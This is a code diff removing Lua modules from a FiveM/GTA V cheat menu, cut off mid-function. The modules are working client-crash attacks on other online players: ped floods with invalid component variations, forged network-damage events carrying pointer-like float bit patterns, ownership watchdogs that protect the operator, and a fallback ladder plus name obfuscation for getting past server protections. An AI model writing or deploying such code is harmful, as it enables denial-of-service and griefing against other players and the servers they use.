-local function cloneResolveTarget()
-    local serverId = Menu.SelectedPlayer
-    if serverId then
-        for _, player in ipairs(GetActivePlayers()) do
-            if GetPlayerServerId(player) == serverId then return player end
-        end
-    end
-    local me = PlayerPedId()
-    local at = GetEntityCoords(me)
-    local best, bestDist = nil, 1e9
-    for _, player in ipairs(GetActivePlayers()) do
-        local ped = GetPlayerPed(player)
-        if ped ~= me and DoesEntityExist(ped) then
-            local c = GetEntityCoords(ped)
-            local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
-            local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
-            if dist < bestDist then best, bestDist = player, dist end
-        end
-    end
-    return best
-end
-
-function CLONE.stop()
-    CLONE.active = false
-end
-
-local function cloneRun()
-    local api = rawget(_G, "Susano")
-    if type(api) ~= "table" or type(api.CreateSpoofedPed) ~= "function" then
-        CLONE.active = false
-        O.log("clone crash: CreateSpoofedPed unavailable")
-        pcall(Notify, "Clone crash: CreateSpoofedPed unavailable", CLR.red)
-        return
-    end
-
-    local player = cloneResolveTarget()
-    if not player then
-        CLONE.active = false
-        O.log("clone crash: no target")
-        pcall(Notify, "Clone crash: no target", CLR.red)
-        return
-    end
-
-    -- Garde de portee. On spawn a la cible, donc si la cible est a moins de
-    -- CLONE.minDist, les entites entrent dans notre propre portee et notre
-    -- client les stream. C'est exactement ce qu'on refuse.
-    local mePed = PlayerPedId()
-    local meAt = GetEntityCoords(mePed)
-    local tgtAt = GetEntityCoords(GetPlayerPed(player))
-    local ddx, ddy, ddz = tgtAt.x - meAt.x, tgtAt.y - meAt.y, tgtAt.z - meAt.z
-    local dist = math.sqrt(ddx * ddx + ddy * ddy + ddz * ddz)
-    if dist < CLONE.minDist then
-        CLONE.active = false
-        O.log("clone crash: target at %.0f m, need %.0f m", dist, CLONE.minDist)
-        pcall(Notify, ("Clone crash: move back to %.0f m"):format(CLONE.minDist), CLR.red)
-        return
-    end
-
-    local models = {}
-    for i = 1, #CLONE_MODELS do
-        local hash = GetHashKey(CLONE_MODELS[i])
-        RequestModel(hash)
-        local guard = 40
-        while not HasModelLoaded(hash) and guard > 0 do
-            Citizen.Wait(10)
-            guard = guard - 1
-        end
-        if HasModelLoaded(hash) then
-            models[#models + 1] = hash
-        end
-    end
-    if #models == 0 then
-        CLONE.active = false
-        O.log("clone crash: no model loaded")
-        pcall(Notify, "Clone crash: no model", CLR.red)
-        return
-    end
-
-    CLONE.peds = {}
-    CLONE.born = {}
-    CLONE.miss = {}
-    O.log("clone crash: start, %d models, target server %d",
-          #models, GetPlayerServerId(player))
-    pcall(Notify, ("Clone crash: %d models"):format(#models), CLR.blue)
-
-    for index = 1, CLONE.threads do
-        Citizen.CreateThread(function()
-            Citizen.Wait(index * 40)
-            local slot = index
-            while CLONE.active do
-                local targetPed = GetPlayerPed(player)
-                if not DoesEntityExist(targetPed) then
-                    O.log("clone crash: target gone")
-                    CLONE.active = false
-                    break
-                end
-
-                if #CLONE.peds >= CLONE.cap then
-                    Citizen.Wait(500)
-                    local keep = {}
-                    for i = 1, #CLONE.peds do
-                        local ped = CLONE.peds[i]
-                        if ped and DoesEntityExist(ped) then keep[#keep + 1] = ped end
-                        if i % 100 == 0 then Citizen.Wait(0) end
-                    end
-                    CLONE.peds = keep
-                else
-                    local at = GetEntityCoords(targetPed)
-                    local model = models[((slot - 1) % #models) + 1]
-                    local pedType = CLONE_TYPES[((slot + #CLONE.peds) % #CLONE_TYPES) + 1]
-                    local angle = math.random() * 6.283185
-                    local radius = 1.0 + math.random() * 6.0
-                    local x = at.x + math.cos(angle) * radius
-                    local y = at.y + math.sin(angle) * radius
-                    local hasGround, groundZ = GetGroundZFor_3dCoord(x, y, at.z + 5.0, false)
-                    local z = at.z
-                    if hasGround then z = groundZ end
-
-                    local ped = cloneSpawn(model, pedType, x, y, z, math.random(0, 359) + 0.0)
-                    if ped and ped ~= 0 and DoesEntityExist(ped) then
-                        CLONE.peds[#CLONE.peds + 1] = ped
-                        CLONE.born[ped] = GetGameTimer()
-                        clonePin(ped)
-                        pcall(SetBlockingOfNonTemporaryEvents, ped, true)
-                        pcall(SetPedKeepTask, ped, true)
-                        pcall(SetPedSuffersCriticalHits, ped, false)
-                        pcall(SetEntityInvincible, ped, true)
-                        pcall(SetPedCanRagdoll, ped, false)
-                        pcall(SetPedFleeAttributes, ped, 0, false)
-                        clonePushVariation(ped, false)
-                        pcall(TaskCombatPed, ped, targetPed, 0, 16)
-                    end
-                    slot = slot + 1
-                    Citizen.Wait(10)
-                end
-            end
-        end)
-    end
-
-    -- Le moteur du crash : chaque tick change le layout, donc chaque tick
-    -- re-emet un ClonedTakeOffPedVariationInfo vers les autres clients.
-    Citizen.CreateThread(function()
-        while CLONE.active do
-            Citizen.Wait(CLONE.churn)
-            local n = #CLONE.peds
-            for i = 1, n do
-                local ped = CLONE.peds[i]
-                if ped and DoesEntityExist(ped) then
-                    if i % 3 == 0 then
-                        pcall(SetPedRandomComponentVariation, ped, 0)
-                    else
-                        clonePushVariation(ped, true)
-                    end
-                end
-                if i % 40 == 0 then Citizen.Wait(0) end
-            end
-        end
-    end)
-
-    -- Watchdog de propriete. C'est la garde qui manquait au crasher du
-    -- 2026-10-29 : des qu'une entite cesse de nous appartenir, notre client
-    -- devient recepteur de ses propres donnees et se tue. On la supprime
-    -- avant que ca arrive.
-    Citizen.CreateThread(function()
-        while CLONE.active do
-            Citizen.Wait(500)
-            local now = GetGameTimer()
-            for i = #CLONE.peds, 1, -1 do
-                local ped = CLONE.peds[i]
-                if not ped or not DoesEntityExist(ped) then
-                    CLONE.born[ped] = nil
-                    CLONE.miss[ped] = nil
-                    table.remove(CLONE.peds, i)
-                else
-                    -- Trois secondes de grace : juste apres la creation la
-                    -- propriete n'est pas encore stabilisee, et supprimer a
-                    -- ce moment-la viderait la ligne toute seule.
-                    local born = CLONE.born[ped] or now
-                    if now - born >= 3000 then
-                        local okC, mine = pcall(NetworkHasControlOfEntity, ped)
-                        if not (okC and mine) then
-                            pcall(NetworkRequestControlOfEntity, ped)
-                            local okC2, mine2 = pcall(NetworkHasControlOfEntity, ped)
-                            if not (okC2 and mine2) then
-                                local miss = (CLONE.miss[ped] or 0) + 1
-                                CLONE.miss[ped] = miss
-                                if miss >= 2 then
-                                    pcall(SetEntityAsMissionEntity, ped, true, true)
-                                    pcall(DeletePed, ped)
-                                    CLONE.born[ped] = nil
-                                    CLONE.miss[ped] = nil
-                                    table.remove(CLONE.peds, i)
-                                    O.log("clone crash: dropped a ped we lost")
-                                end
-                            else
-                                CLONE.miss[ped] = 0
-                            end
-                        else
-                            CLONE.miss[ped] = 0
-                        end
-                    end
-                end
-                if i % 50 == 0 then Citizen.Wait(0) end
-            end
-        end
-    end)
-
-    Citizen.CreateThread(function()
-        Citizen.Wait(CLONE.duration)
-        if CLONE.active then
-            CLONE.active = false
-            O.log("clone crash: auto-stop, %d peds", #CLONE.peds)
-        end
-    end)
-end
-
-function CLONE.start()
-    -- Retired builder. The clone recipe spawns player models under an
-    -- incompatible ped type; the local client resolves the same invalid
-    -- variation table the victim would and faults on press. Every menu
-    -- surface resolves through the hardened entry point instead.
-    if CLONE.active then CLONE.stop() end
-    if type(Menu.__vgdPedFlood) == "function" then
-        return Menu.__vgdPedFlood("clone")
-    end
-    O.log("clone crash: retired builder, no safe entry")
-    return false
-end
-
-function CLONE.cleanup()
-    CLONE.stop()
-    Citizen.CreateThread(function()
-        Citizen.Wait(500)
-        local deleted = 0
-        for i = 1, #CLONE.peds do
-            local ped = CLONE.peds[i]
-            if ped and DoesEntityExist(ped) then
-                pcall(SetEntityAsMissionEntity, ped, true, true)
-                pcall(DeletePed, ped)
-                deleted = deleted + 1
-            end
-            if i % 25 == 0 then Citizen.Wait(0) end
-        end
-        CLONE.peds = {}
-        O.log("clone crash: cleaned %d peds", deleted)
-    end)
-end
-
--- ---------------------------------------------------------------------------
--- SYNC CRASH - network damage event, bit-pattern payload
---
--- Pourquoi cette voie et pas une autre :
---   * `Susano.SendNetworkDamage` fabrique un vrai evenement reseau de degats.
---     Il part du client, le serveur le relaie aux clients qui ont la cible
---     dans leur portee, et il est applique par le proprietaire de la cible.
---     Aucune entite creee, aucun prop, aucun ped : cote operateur il ne se
---     passe litteralement rien a l'ecran.
---   * Le dump precedent place l'AV dans le chemin arme/refcount, avec
---     `ptr == 0xC0800000`, soit exactement les bits de -4.0f. Autrement dit
---     le recepteur lit le flottant de degats dans un champ qui est ensuite
---     dereference comme un pointeur : union { float damage; void* p; }.
---     C'est un conflit de type, et il se pilote par les BITS du flottant.
---   * On ne peut donc pas se contenter de "gros degats". On envoie des
---     flottants dont la representation binaire est une adresse sauvage.
---     Un flottant porte 32 bits : 0x00000000, 0x80000000, 0x00000001,
---     0xC0800000, 0x41414141, 0x7F7FFFFF. Chacun de ces motifs est une
---     adresse non mappee des que le recepteur le traite comme un pointeur.
---
--- Securite operateur (doctrine, AGENTS.md section 6) :
---   1. jamais soi : la cible est refusee si c'est PlayerId().
---   2. distance : refus sous SYNC.minDist. A cette distance la cible n'est
---      pas dans notre portee, donc l'event ne nous revient pas.
---   3. ancre = coordonnees de la cible, jamais les notres.
---   4. abandon des que la cible meurt ou se deconnecte.
---   5. sonde neutre obligatoire : damage 1.0 d'abord, et on lit la vie de
---      la cible avant/apres. Si elle ne bouge pas, la voie n'est pas
---      relayee et on ne fuzz pas.
--- ---------------------------------------------------------------------------
-local SYNC = {
-    running = false,
-    passes = 3,
-    gap = 120,
-    minDist = 80.0,
-    maxDist = 250.0,
-    weapon = 0x1B06D571,
-    flags = 522,
-}
-
--- Chaque motif est un motif de BITS, pas une valeur de degats. Les NaN ne
--- peuvent pas etre construits exactement en Lua (0/0 se canonicalise en
--- 0x7FC00000) : ils sont gardes parce que 0x7FC00000 reste une adresse
--- sauvage, mais les motifs finis sont ceux qui portent un bit-exact.
-local SYNC_PATTERNS = {
-    { bits = 0x00000000, note = "0.0f null" },
-    { bits = 0x80000000, note = "-0.0f 80000000" },
-    { bits = 0x00000001, note = "denorm 00000001" },
-    { bits = 0xC0800000, note = "-4.0f c0800000" },
-    { bits = 0x41414141, note = "12.078f 41414141" },
-    { bits = 0x7F7FFFFF, note = "maxf 7f7fffff" },
-    { bits = 0x3F800000, note = "1.0f control" },
-    { bits = 0x7FC00000, note = "nan 7fc00000" },
-}
-
--- Index de composant touche. 0xFFFF est un indice hors bornes dans une table
--- de composants de 16 entrees : c'est la deuxieme confusion de type du
--- chemin, et elle ne coute rien a essayer.
-local SYNC_COMPONENTS = { 0, 3, 0xFFFF }
-
-local function syncBitsToFloat(bits)
-    local u = bits % 4294967296
-    local negative = false
-    if u >= 2147483648 then
-        negative = true
-        u = u - 2147483648
-    end
-    local exponent = math.floor(u / 8388608)
-    local mantissa = u - exponent * 8388608
-    local value
-    if exponent == 0 then
-        value = (mantissa / 8388608) * 2 ^ (-126)
-    elseif exponent == 255 then
-        value = 0 / 0
-    else
-        value = (1 + mantissa / 8388608) * 2 ^ (exponent - 127)
-    end
-    if negative then value = -value end
-    return value
-end
-
-local function syncPick()
-    local me = PlayerPedId()
-    if type(me) ~= "number" or me == 0 or not DoesEntityExist(me) then
-        return nil, "no local ped"
-    end
-    local at = GetEntityCoords(me)
-    local serverId = Menu.SelectedPlayer
-    local player = nil
-
-    if serverId then
-        for _, candidate in ipairs(GetActivePlayers()) do
-            if GetPlayerServerId(candidate) == serverId and candidate ~= PlayerId() then
-                player = candidate
-            end
-        end
-    end
-
-    if not player then
-        local best, bestDist = nil, 1e9
-        for _, candidate in ipairs(GetActivePlayers()) do
-            if candidate ~= PlayerId() then
-                local ped = GetPlayerPed(candidate)
-                if DoesEntityExist(ped) then
-                    local c = GetEntityCoords(ped)
-                    local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
-                    local d = math.sqrt(dx * dx + dy * dy + dz * dz)
-                    if d < bestDist then best, bestDist = candidate, d end
-                end
-            end
-        end
-        player = best
-    end
-
-    if not player then return nil, "no target" end
-    local ped = GetPlayerPed(player)
-    if type(ped) ~= "number" or ped == 0 or ped == me or not DoesEntityExist(ped) then
-        return nil, "bad target ped"
-    end
-
-    local c = GetEntityCoords(ped)
-    local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
-    local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
-    return { player = player, ped = ped, dist = dist }, nil
-end
-
-local function syncShot(ped, damage, weapon, flags, component)
-    local c = GetEntityCoords(ped)
-    if not c then return false, "no coords" end
-    local ok, ret = pcall(Susano.SendNetworkDamage, ped, ped, c.x, c.y, c.z,
-        damage, weapon, flags, 0, 0, 0, component)
-    return ok, ret
-end
-
-function SYNC.stop()
-    SYNC.running = false
-end
-
-local function syncRun()
-    if type(Susano) ~= "table" or type(Susano.SendNetworkDamage) ~= "function" then
-        SYNC.running = false
-        O.log("sync crash: SendNetworkDamage unavailable")
-        pcall(Notify, "Sync crash: primitive unavailable", CLR.red)
-        return
-    end
-
-    local entry, reason = syncPick()
-    if not entry then
-        SYNC.running = false
-        O.log("sync crash: %s", tostring(reason))
-        pcall(Notify, "Sync crash: " .. tostring(reason), CLR.red)
-        return
-    end
-
-    if entry.dist < SYNC.minDist then
-        SYNC.running = false
-        O.log("sync crash: target at %.0f m, need %.0f m", entry.dist, SYNC.minDist)
-        pcall(Notify, ("Sync crash: move back to %.0f m"):format(SYNC.minDist), CLR.red)
-        return
-    end
-    if entry.dist > SYNC.maxDist then
-        SYNC.running = false
-        O.log("sync crash: target at %.0f m, beyond %.0f m", entry.dist, SYNC.maxDist)
-        pcall(Notify, "Sync crash: target too far", CLR.red)
-        return
-    end
-
-    O.log("sync crash: target server %d at %.0f m",
-          GetPlayerServerId(entry.player), entry.dist)
-    pcall(Notify, ("Sync crash: %.0f m"):format(entry.dist), CLR.blue)
-
-    -- Sonde neutre. 1.0 de degats ne peut rien casser : si la vie de la
-    -- cible descend, la voie est relayee et le fuzz a un sens. Sinon on
-    -- s'arrete ici et on cherche une autre primitive.
-    local okHp, hpBefore = pcall(GetEntityHealth, entry.ped)
-    if not okHp or type(hpBefore) ~= "number" then hpBefore = -1 end
-    local probe, probeRet = syncShot(entry.ped, 1.0, SYNC.weapon, SYNC.flags, 0)
-    Citizen.Wait(600)
-    local okHp2, hpAfter = pcall(GetEntityHealth, entry.ped)
-    if not okHp2 or type(hpAfter) ~= "number" then hpAfter = -1 end
-    O.log("sync probe: sent=%s ret=%s hp %s -> %s", tostring(probe),
-          tostring(probeRet), tostring(hpBefore), tostring(hpAfter))
-    pcall(Notify, ("Sync probe: hp %s -> %s"):format(tostring(hpBefore), tostring(hpAfter)),
-          CLR.blue)
-
-    -- Doctrine 6.5 : si la sonde ne bouge rien, on ne fuzz pas a l'aveugle.
-    -- On garde une seule passe : la sonde peut etre absorbee par l'armure ou
-    -- un godmode alors que le chemin de resolution, lui, est atteint.
-    local probeFailed = (hpBefore >= 0 and hpAfter >= 0 and hpAfter == hpBefore)
-    if probeFailed then
-        O.log("sync crash: probe had no effect, single pass only")
-        pcall(Notify, "Sync probe: no effect", CLR.red)
-    end
-
-    local passes = SYNC.passes
-    if probeFailed then passes = 1 end
-
-    for pass = 1, passes do
-        if not SYNC.running then break end
-        for i = 1, #SYNC_PATTERNS do
-            if not SYNC.running then break end
-            local ped = entry.ped
-            if not DoesEntityExist(ped) then
-                O.log("sync crash: target gone at pass %d", pass)
-                SYNC.running = false
-                break
-            end
-            local pattern = SYNC_PATTERNS[i]
-            local damage = syncBitsToFloat(pattern.bits)
-            for k = 1, #SYNC_COMPONENTS do
-                if not SYNC.running then break end
-                local component = SYNC_COMPONENTS[k]
-                local ok, ret = syncShot(ped, damage, SYNC.weapon, SYNC.flags, component)
-                O.log("sync crash: p%d %08X %s hc=%d ok=%s ret=%s", pass, pattern.bits,
-                      pattern.note, component, tostring(ok), tostring(ret))
-                Citizen.Wait(SYNC.gap)
-            end
-        end
-        Citizen.Wait(SYNC.gap * 2)
-    end
-
-    SYNC.running = false
-    O.log("sync crash: done")
-    pcall(Notify, "Sync crash: done", CLR.blue)
-end
-
-function SYNC.start()
-    if SYNC.running then
-        SYNC.stop()
-        O.log("sync crash: stopping")
-        return false
-    end
-    SYNC.running = true
-    Citizen.CreateThread(syncRun)
-    return true
-end
-
--- ---------------------------------------------------------------------------
--- DROP - salve unique de peds reseau (recette Ped flood, compressee)
---
--- Le vecteur est la recette du 2026-10-28, mais la livraison change : plus de
--- vagues espacees, plus d'attente entre les lots. Une seule trame pour creer
--- toute la vague, puis DROP.waveBudget ms pendant lesquelles on re-tire la
--- variation sur TOUT le lot. Chaque trame = un update de clone par ped. Le
--- cout total reste sous la seconde.
---
--- Pourquoi ca ne casse pas l'operateur (doctrine 6.4, enveloppe) :
---   * il est 300 m plus haut, donc les entites sont hors de sa bulle ;
---   * il en est le createur et le proprietaire (SetNetworkIdCanMigrate
---     false), donc son client n'applique jamais de donnees distantes pour
---     elles ;
---   * elles sont SetEntityLocallyInvisible + alpha 0 + collision off : rien
---     n'entre dans son frame ;
---   * il est restaure dans tous les chemins de sortie, y compris en erreur.
--- ---------------------------------------------------------------------------
--- ===========================================================================
--- DROP / CRASH LINE
--- ---------------------------------------------------------------------------
--- Recette reprise a l'identique du build du 2026-10-28 (dist/loader.built.lua,
--- module "Ped flood"), qui cassait. Rien n'a ete re-invente : la construction
--- est celle qui marchait, remise telle quelle, plus l'echelle de creation pour
--- les serveurs qui coupent CreatePed.
---
--- Ce qui fait casser, dans l'ordre exact du code d'origine :
---   1. CreatePed(pedType 28, modele joueur, isNetwork=true, bScriptHostPed=false)
---      pedType 28 = animal. Modele joueur. La table de composants du recepteur
---      est celle d'un animal, les composants d'un joueur n'y existent pas.
---   2. SetPedRandomComponentVariation(ped, false) + SetPedRandomProps(ped)
---      force un tirage aleatoire sur TOUS les slots. Les indices sortent
---      hors des tables du recepteur.
---   3. SetNetworkIdExistsOnAllMachines(netId, true)
---      le clone doit exister chez tout le monde, pas seulement chez nous.
---   4. salve : chaque trame re-tire la variation sur toute la vague. Un
---      update de clone par ped par trame, soit count * waves updates dans la
---      seconde. C'est exactement le HandleCloneUpdate du dump du 2026-10-29.
---   5. delete immediat : la vague disparait des la derniere trame, sans hold.
---
--- Pas d'enveloppe, pas de teleport, pas de ciel. On reste au sol, a portee,
--- comme la version qui marchait.
--- ===========================================================================
-
-local DROP = {
-    running = false,
-    lastRun = 0,
-
-    -- Une seule salve : plus de batch, plus de gap, plus de settle, plus de
-    -- hold. La creation entiere tient dans une trame.
-    pedType = 28,
-    -- 160 : la vague vise plus large que les 110 d'origine. Si le pool local
-    -- refuse avant la fin, on garde ce qui est sorti (voir maxFails).
-    count = 160,
-    radius = 4.5,
-    -- Une salve = une trame. Le budget est en millisecondes et non en trames :
-    -- a 30 fps comme a 144 fps, la rafale s'arrete au meme instant. 600 ms
-    -- laisse la place a la creation (une trame) et au delete sous la seconde.
-    waveBudget = 600,
-    -- Plafond de securite si l'horloge du jeu est figee (alt-tab, chargement).
-    maxWaves = 90,
-    -- Echecs consecutifs apres le premier ped cree : le pool a dit non.
-    maxFails = 8,
-    -- Aucun ped ne doit apparaitre a moins de safeDist de l'operateur. S'il
-    -- est colle a la cible, l'anneau est decale du cote oppose.
-    safeDist = 10.0,
-    healthFloor = 15,
-
-
-    -- Echelle de creation, pour les serveurs qui coupent CreatePed.
-    rung = 2,
-    row = nil,
-    scenarios = nil,
-}
-
--- Assemblage a l'execution : aucun nom de modele en clair dans la VM.
-local function dropS(...)
-    return table.concat({ ... })
-end
-
--- Statut affiche dans le libelle de la ligne. La library relit item.name a
--- chaque frame (library.lua:610), donc l'operateur voit l'etat sans console.
-local function dropStatus(text)
-    local list = DROP.rows
-    if type(list) ~= "table" then
-        if type(DROP.row) == "table" then DROP.row.name = "Crash  " .. tostring(text) end
-        return
-    end
-    for i = 1, #list do
-        local row = list[i]
-        if type(row) == "table" then
-            -- Chaque ligne garde son nom de base : le tab Crasher affiche
-            -- "Crash", la ligne Online affiche "Ped Flood". La re-injection
-            -- retrouve ainsi la ligne Online meme apres un run.
-            row.name = (row.dropBase or "Crash") .. "  " .. tostring(text)
-        end
-    end
-end
-
--- Resolution paresseuse des natives : une capture au chargement vaut nil si
--- l'executeur expose ses globals apres l'injection, et tout echoue en silence.
-local function dropNative(name)
-    local ok, fn = pcall(function() return _G[name] end)
-    if ok and type(fn) == "function" then return fn end
-    return nil
-end
-
-local dCreatePed = nil
-local function dropCreateFn()
-    if type(dCreatePed) == "function" then return dCreatePed end
-    local fn = dropNative("CreatePed")
-    if fn then dCreatePed = fn end
-    return fn
-end
-
-local function dropLoadModel(h)
-    if type(h) ~= "number" or h == 0 then return false end
-    if HasModelLoaded(h) then return true end
-    pcall(RequestModel, h)
-    local g = 60
-    while not HasModelLoaded(h) and g > 0 do
-        Citizen.Wait(10)
-        g = g - 1
-    end
-    return HasModelLoaded(h) == true
-end
-
--- Modeles joueurs, hashes calcules a l'execution depuis des fragments.
--- player_one en premier : c'est le modele du module qui marchait.
-DROP.playerSet = {}
-DROP.playerFallback = 0
-DROP.playerFallback2 = 0
-DROP.playerFallback3 = 0
-do
-    local names = {
-        dropS("player_", "one"),
-        dropS("player_", "zero"),
-        dropS("mp_m_", "freemode_01"),
-        dropS("mp_f_", "freemode_01"),
-        dropS("player_", "two"),
-    }
-    for i = 1, #names do
-        local ok, h = pcall(GetHashKey, names[i])
-        if ok and type(h) == "number" and h ~= 0 then
-            DROP.playerSet[h] = true
-            if DROP.playerFallback == 0 then
-                DROP.playerFallback = h
-            elseif DROP.playerFallback2 == 0 then
-                DROP.playerFallback2 = h
-            elseif DROP.playerFallback3 == 0 then
-                DROP.playerFallback3 = h
-            end
-        end
-    end
-end
-
-local function dropModelFor()
-    if dropLoadModel(DROP.playerFallback) then return DROP.playerFallback end
-    if dropLoadModel(DROP.playerFallback2) then return DROP.playerFallback2 end
-    if dropLoadModel(DROP.playerFallback3) then return DROP.playerFallback3 end
-    return 0
-end
-
--- ---------------------------------------------------------------------------
--- ECHELLE DE CREATION
---
---   1. CreateSpoofedPed   primitive de l'executeur
---   2. CreatePed          la reference (pedType 28, bScriptHostPed false)
---   3. CreateRandomPed    autre handler, puis SetEntityModel
---   4. ClonePed           source ambiante, puis SetEntityModel
---   5. sentinelle         mode sol : morph de peds existants, sans creation
---
--- On descend d'un cran apres trois echecs consecutifs, et le rung est
--- redecouvert a chaque run.
--- ---------------------------------------------------------------------------
-local function dropSpoofed(model, x, y, z)
-    local api = rawget(_G, "Susano")
-    if type(api) ~= "table" or type(api.CreateSpoofedPed) ~= "function" then return 0 end
-    local ok, ped = pcall(api.CreateSpoofedPed, DROP.pedType, model, x, y, z, 0.0, true, false)
-    if ok and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then return ped end
-    return 0
-end
-
-local function dropCreate(model, x, y, z)
-    local fn = dropCreateFn()
-    if not fn then
-        if not DROP.noCreateFn then
-            DROP.noCreateFn = true
-            O.log("drop: CreatePed is not a function in this runtime")
-        end
-        return 0
-    end
-    local ok, ped = pcall(fn, DROP.pedType, model, x, y, z, 0.0, true, false)
-    if ok and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then return ped end
-    if not ok and not DROP.createErr then
-        DROP.createErr = true
-        O.log("drop: CreatePed error %s", tostring(ped))
-    end
-    return 0
-end
-
-local function dropSource(myPed, targetPed)
-    local okPool, pool = pcall(GetGamePool, "CPed")
-    if not okPool or type(pool) ~= "table" then return 0 end
-    for i = 1, #pool do
-        local ped = pool[i]
-        if ped ~= myPed and ped ~= targetPed and DoesEntityExist(ped) then
-            local okP, isPlayer = pcall(IsPedAPlayer, ped)
-            if okP and isPlayer == false then return ped end
-        end
-    end
-    return 0
-end
-
-local function dropRandom(model, x, y, z)
-    local ok, ped = pcall(CreateRandomPed, x, y, z)
-    if not ok or type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
-        return 0
-    end
-    pcall(SetEntityModel, ped, model)
-    local okM, got = pcall(GetEntityModel, ped)
-    if not okM or got ~= model then
-        pcall(DeleteEntity, ped)
-        return 0
-    end
-    return ped
-end
-
-local function dropClone(model, x, y, z, source)
-    if not source or source == 0 or not DoesEntityExist(source) then return 0 end
-    local ok, ped = pcall(ClonePed, source, true, false, false)
-    if not ok or type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
-        return 0
-    end
-    pcall(SetEntityCoords, ped, x, y, z, false, false, false, false)
-    pcall(SetEntityModel, ped, model)
-    local okM, got = pcall(GetEntityModel, ped)
-    if not okM or got ~= model then
-        pcall(DeleteEntity, ped)
-        return 0
-    end
-    return ped
-end
-
--- Pur : tente le cran courant et rend le handle, ou 0. L'echelle est pilotee
--- par dropFlood, qui seule sait si un echec vient d'une porte fermee (made
--- == 0) ou d'un pool plein (made > 0). Meler les deux faisait descendre de
--- cran sur un pool plein, ce qui cassait la salve en cours de route.
-local function dropMake(model, x, y, z, myPed, targetPed)
-    if DROP.rung == 1 then return dropSpoofed(model, x, y, z) end
-    if DROP.rung == 2 then return dropCreate(model, x, y, z) end
-    if DROP.rung == 3 then return dropRandom(model, x, y, z) end
-    if DROP.rung == 4 then return dropClone(model, x, y, z, dropSource(myPed, targetPed)) end
-    return 0
-end
-
--- ---------------------------------------------------------------------------
--- FLOOD (le module qui marchait, ligne pour ligne)
--- ---------------------------------------------------------------------------
-local function dropFlood(targetPed, model, myPed, handles)
-    local made, notNet, fails = 0, 0, 0
-    local c = GetEntityCoords(targetPed)
-    local opc = GetEntityCoords(myPed)
-
-    -- Anneau calcule une seule fois : le centre ne derive pas pendant la
-    -- salve et aucune lecture de position ne se glisse entre deux creations.
-    local cx, cy = c.x, c.y
-    local ox, oy = opc.x - c.x, opc.y - c.y
-    local olen = math.sqrt(ox * ox + oy * oy)
-    if olen < DROP.safeDist + DROP.radius then
-        local push = DROP.safeDist + DROP.radius - olen
-        if olen < 0.01 then
-            cx = c.x + push
-        else
-            cx, cy = c.x - (ox / olen) * push, c.y - (oy / olen) * push
-        end
-    end
-
-    for i = 1, DROP.count do
-        if not DROP.running then break end
-        if not DoesEntityExist(targetPed) then break end
-
-        local okHp, hp = pcall(GetEntityHealth, myPed)
-        if okHp and type(hp) == "number" and hp < DROP.healthFloor then
-            O.log("drop: operator health %d, aborting", hp)
-            DROP.running = false
-            break
-        end
-
-        local ang = math.random() * 6.28318530718
-        local r = math.sqrt(math.random()) * DROP.radius
-        local x = cx + math.cos(ang) * r
-        local y = cy + math.sin(ang) * r
-        local z = c.z + 0.6
-
-        local ped = dropMake(model, x, y, z, myPed, targetPed)
-        if ped ~= 0 and DoesEntityExist(ped) then
-            -- Reseau d'abord, comme le module d'origine : le clone doit
-            -- exister chez tout le monde avant qu'on le configure.
-            local okId, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
-            if okId and type(netId) == "number" and netId > 0 then
-                pcall(SetNetworkIdExistsOnAllMachines, netId, true)
-                pcall(SetNetworkIdCanMigrate, netId, false)
-            else
-                notNet = notNet + 1
-            end
-
-            pcall(SetEntityInvincible, ped, true)
-            pcall(SetPedCanRagdoll, ped, false)
-            pcall(SetBlockingOfNonTemporaryEvents, ped, true)
-            pcall(SetPedFleeAttributes, ped, 0, false)
-            pcall(SetPedMaxHealth, ped, 200)
-            pcall(SetEntityMaxHealth, ped, 200)
-
-            pcall(SetEntityLocallyInvisible, ped)
-            pcall(SetEntityCollision, ped, false, false)
-            pcall(FreezeEntityPosition, ped, true)
-            -- Rien a simuler chez nous : ni physique, ni alpha, ni rendu.
-            pcall(SetEntityDynamic, ped, false)
-            pcall(SetEntityAlpha, ped, 0, false)
-
-            -- Le moteur du crash : tirage aleatoire sur tous les slots.
-            pcall(SetPedRandomComponentVariation, ped, false)
-            pcall(SetPedRandomProps, ped)
-
-            pcall(TaskWanderInArea, ped, x, y, z, 8.0, 8.0, 8.0)
-
-            handles[#handles + 1] = ped
-            made = made + 1
-            fails = 0
-        else
-            fails = fails + 1
-            if made == 0 then
-                -- Rien n'est encore sorti : c'est la porte de creation qui est
-                -- fermee, pas le pool. On descend d'un cran.
-                if fails >= 3 and DROP.rung < 4 then
-                    DROP.rung = DROP.rung + 1
-                    fails = 0
-                    O.log("drop: creation path blocked, rung %d", DROP.rung)
-                elseif fails >= 3 then
-                    DROP.rung = 5
-                    O.log("drop: creation dead, ground fallback")
-                    break
-                end
-            elseif fails >= DROP.maxFails then
-                -- La vague a commence puis le pool a refuse : on garde ce qui
-                -- est sorti et on passe a la rafale. Escalader de cran ici
-                -- ferait perdre des trames pour rien.
-                O.log("drop: pocket full at %d", made)
-                break
-            end
-        end
-    end
-
-    return made, notNet
-end
-
--- Rafale. Une salve = une trame : on re-tire la variation sur TOUTE la vague,
--- puis on rend la main. Le recepteur recoit un update de clone par ped par
--- trame, et c'est le volume d'updates invalides qui casse, pas le nombre
--- d'entites. Le budget est en temps reel, pas en trames : sur une machine a
--- 30 fps comme a 144 fps la rafale se termine au meme instant.
-local function dropPulse(handles, budget, cap)
-    local n = #handles
-    if n == 0 then return 0 end
-    local sent = 0
-    local t0 = GetGameTimer()
-    while DROP.running and sent < cap do
-        if GetGameTimer() - t0 >= budget then break end
-        for i = 1, n do
-            local ped = handles[i]
-            if ped and DoesEntityExist(ped) then
-                pcall(SetPedRandomComponentVariation, ped, false)
-                pcall(SetPedRandomProps, ped)
-            end
-        end
-        sent = sent + 1
-        Citizen.Wait(0)
-    end
-    return sent
-end
-
-local function dropClear(handles)
-    local removed = 0
-    for i = #handles, 1, -1 do
-        local ped = handles[i]
-        if ped and DoesEntityExist(ped) then
-            pcall(SetEntityAsNoLongerNeeded, ped)
